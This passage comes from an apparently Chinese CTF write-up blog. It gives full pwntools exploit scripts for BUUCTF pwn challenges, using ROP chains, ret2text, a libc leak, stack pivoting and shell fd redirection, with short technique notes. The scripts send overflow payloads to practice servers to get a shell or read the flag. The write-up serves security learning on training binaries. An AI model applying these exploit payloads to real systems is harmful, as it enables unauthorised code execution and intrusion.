punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Index :'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'aa'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'aa'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x8</span><span class=\"token punctuation\">,</span> p32<span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>printcont<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"jarvisoj_test_your_memory\"><a class=\"markdownIt-Anchor\" href=\"#jarvisoj_test_your_memory\">#</a> jarvisoj_test_your_memory</h2>\n<h2 id=\"cmcc_simplerop\"><a class=\"markdownIt-Anchor\" href=\"#cmcc_simplerop\">#</a> cmcc_simplerop</h2>\n<p>ropchain</p>\n<p>这题用 ROPgadget 秒解，但是需要进行修改，因为只能输入 100 个字符。</p>\n<p>没有遇 ‘\\0’ 截断的函数，所以可以把数字输入全部换成 pop 的形式。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> struct <span class=\"token keyword\">import</span> pack</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>r<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">29465</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#r=process('./simplerop')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>p<span class=\"token operator\">=</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span>offset</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0806e82a</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># pop edx ; ret</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x080ea060</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># @ .data</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x080bae06</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># pop eax ; ret</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>p <span class=\"token operator\">+=</span> <span class=\"token string\">b'/bin'</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0809a15d</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># mov dword ptr [edx], eax ; ret</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0806e82a</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># pop edx ; ret</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x080ea064</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># @ .data + 4</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x080bae06</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># pop eax ; ret</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>p <span class=\"token operator\">+=</span> <span class=\"token string\">b'//sh'</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0809a15d</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># mov dword ptr [edx], eax ; ret</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0806e850</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># pop edx ; pop ecx ; pop ebx ; ret</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>p <span class=\"token operator\">+=</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">0x080ea060</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x080bae06</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># pop eax ; ret</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xb</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#0xb</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x080493e1</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># int 0x80</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'input :'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"picoctf_2018_buffer_overflow_2\"><a class=\"markdownIt-Anchor\" href=\"#picoctf_2018_buffer_overflow_2\">#</a> PicoCTF_2018_buffer_overflow_2</h2>\n<p>ret2text</p>\n<p>需要注意后门函数两个参数必须为指定值才能输出 flag。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">29816</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p=process('./PicoCTF_2018_buffer_overflow_2')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>target <span class=\"token operator\">=</span> <span class=\"token number\">0x0080485CB</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>main <span class=\"token operator\">=</span> <span class=\"token number\">0x0804866D</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x06c</span><span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>main<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">0x0DEADBEEF</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">0x0DEADC0DE</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Please enter your string: \\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"wustctf2020_getshell_2\"><a class=\"markdownIt-Anchor\" href=\"#wustctf2020_getshell_2\">#</a> wustctf2020_getshell_2</h2>\n<p>ret2text</p>\n<p>这题的栈溢出只能溢出一个返回地址加 4 字节，所以如果按以往的方法只能放一个 gadget 和其返回地址。但如果用含 call 的汇编指令，返回地址由程序按正常方式放入，就可以做到放一个 gadget 和一个参数了。</p>\n<p>这题的字符串是一串乱码，但结尾是 sh，所以可以直接取 sh 的地址作 system 的参数。</p>\n<p><img data-src=\"./image-20230914211535334.png\" alt=\"image-20230914211535334\"></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">27939</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p=process('./wustctf2020_getshell_2')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#gdb.attach(p, 'b puts')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">0x18</span> <span class=\"token operator\">+</span><span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>sys <span class=\"token operator\">=</span> <span class=\"token number\">0x8048529</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>sh <span class=\"token operator\">=</span> <span class=\"token number\">0x08048670</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>payload <span class=\"token operator\">=</span> offset<span class=\"token operator\">*</span><span class=\"token string\">b'a'</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>sh<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\\\_\\\\ \\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>ps: 我有个神奇的思路，这道题没有开地址随机化，因此 libc 地址固定的，所以可以两次启动程序，第一次利用 call _puts 先泄露基地址然后找到 libc 中的 /bin/sh 字符串的地址，在第二次启动中使用。</p>\n<p>但是本地打通了，远程没成功。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">27939</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#p=process('./wustctf2020_getshell_2')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#gdb.attach(p, 'b puts')</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./wustctf2020_getshell_2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>puts_p <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>main_a <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>lsm_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>puts_call <span class=\"token operator\">=</span> <span class=\"token number\">0x08048577</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">0x18</span> <span class=\"token operator\">+</span><span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>payload = b'a'*offset + p32(puts_call) + p32(lsm_g)</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>print('length: %x'%len(payload))</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>p.recvuntil(b'\\\\_\\\\ \\n\\n')</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>p.sendline(payload)</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>lsm_a = u32(p.recv(4))</pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>p.close()</pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>p=remote('node4.buuoj.cn',27939)</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>lsm_a <span class=\"token operator\">=</span> <span class=\"token number\">0xf7df2540</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>libc<span class=\"token operator\">=</span>LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">,</span>lsm_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>libcbase <span class=\"token operator\">=</span> lsm_a <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>sys_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>bs_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'str_bin_sh'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>sys <span class=\"token operator\">=</span> <span class=\"token number\">0x8048529</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>payload <span class=\"token operator\">=</span> offset<span class=\"token operator\">*</span><span class=\"token string\">b'a'</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>bs_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\\\_\\\\ \\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"./image-20230914214946575.png\" alt=\"image-20230914214946575\"></p>\n<h2 id=\"bbys_tu_2016\"><a class=\"markdownIt-Anchor\" href=\"#bbys_tu_2016\">#</a> bbys_tu_2016</h2>\n<p>ret2text</p>\n<p>这垃圾 buu 系统不知道为啥我不先输入他什么都不显示。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">28253</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p=process('./bbys_tu_2016')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#gdb.attach(p, 'b puts')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>target <span class=\"token operator\">=</span> <span class=\"token number\">0x00804856D</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x0c</span><span class=\"token operator\">+</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">#p.recvuntil('This program is hungry. You should feed it.')</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"xdctf2015_pwn200\"><a class=\"markdownIt-Anchor\" href=\"#xdctf2015_pwn200\">#</a> xdctf2015_pwn200</h2>\n<p>ret2libc3</p>\n<h2 id=\"mrctf2020_easyoverflow\"><a class=\"markdownIt-Anchor\" href=\"#mrctf2020_easyoverflow\">#</a> mrctf2020_easyoverflow</h2>\n<p>考查栈的理解</p>\n<p>n0t_r3@11y_f1@g</p>\n<p>ju3t_@_f@k3_f1@g</p>\n<p>system (“/bin/sh”); 在主函数里，只要通过字符串比较即可执行。利用字符串溢出修改 v5 的值。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">29368</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p=process('./mrctf2020_easyoverflow')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">0x030</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span>offset <span class=\"token operator\">+</span> <span class=\"token string\">b'n0t_r3@11y_f1@g'</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"ciscn_2019_s_4\"><a class=\"markdownIt-Anchor\" href=\"#ciscn_2019_s_4\">#</a> ciscn_2019_s_4</h2>\n<p>ret2libc2 栈迁移</p>\n<p>字符串溢出最多到返回地址处，因此将栈迁移到字符串 buf 起始位置。</p>\n<p>在迁移前需要得知栈上地址，第一次 read 输入 0x28 字节刚好到达旧 ebp 位置，获取其地址，计算偏移为 - 0x38，得到 buf 的地址。</p>\n<p>第二次构造 payload 时，先空出 4 字节给 ebp，然后接 system 的 plt 地址、返回地址以及字符串的地址，之后再接’/bin/sh\\0’字符串。因此字符串地址应该为 buf 地址加 16。之后填充至旧 ebp 处，用 buf 地址替换旧 ebp，而返回地址填入 leave;ret 地址。</p>\n<p>不知道 buu 在发什么颠，getshell 后就退出控制了，所以选择用 cat flag 命令。</p>\n<pre><code>#!/usr/bin/python3\nfrom pwn import *\ncontext(log_level='debug')\n#e=ELF('./')\n#p=process('./ciscn_s_4')\np=remote('node4.buuoj.cn',25150)\n#gdb.attach(p, 'b read')\n\noffset = 0x028\npayload = b'a'*(offset-1) + b'b' \n\np.sendafter('your name?',payload)\np.recvuntil(b'ab')\nebp = u32(p.recv(4))\nprint('the ebp is 0x%x'%ebp)\n\nbuf = ebp - 0x38\nsys = 0x8048400\nsys_c = 0x08048559\nleave_ret = 0x080485FD\npayload =  p32(ebp)+ p32(sys) + p32(sys_c) + p32(buf+0x10) + b'cat flag\\0'\nassert len(payload) &lt;= offset\npayload = payload.ljust(offset,b'a') + p32(buf) +p32(leave_ret)\np.send(payload)\np.interactive()\n</code></pre>\n<h2 id=\"wustctf2020_closed\"><a class=\"markdownIt-Anchor\" href=\"#wustctf2020_closed\">#</a> *wustctf2020_closed</h2>\n<p>这题题目给了 shell 函数，直接执行 system (‘/bin/sh’) 但是执行了 close (2) 和 close (1)，关闭了标准输出和错误输出。</p>\n<p>解决方法是用 bash 命令重定向输出到标准输入。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">exec</span> <span class=\"token operator\"><span class=\"token file-descriptor important\">1</span>></span><span class=\"token file-descriptor important\">&amp;0</span></pre></td></tr></table></figure><p><img data-src=\"./image-20230915002630116.png\" alt=\"image-20230915002630116\"></p>\n<h2 id=\"\"><a class=\"markdownIt-Anchor\" href=\"#\">#</a> </h2>\n<p>泄露 cca8 处的栈地址，为第 2 个格式参数。得到 ccbf，目标地址 cefc，偏移为 cefc-ccbf=23d。</p>\n<p>字符串头取 cdcc 处，为第 (cdcc-cca0)/4=4b 个格式参数。</p>\n<p>修改 format 末端</p>\n<p><img data-src=\"./image-20230915100049886.png\" alt=\"image-20230915100049886\"></p>\n<h2 id=\"-2\"><a class=\"markdownIt-Anchor\" href=\"#-2\">#</a> </h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher3 <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span 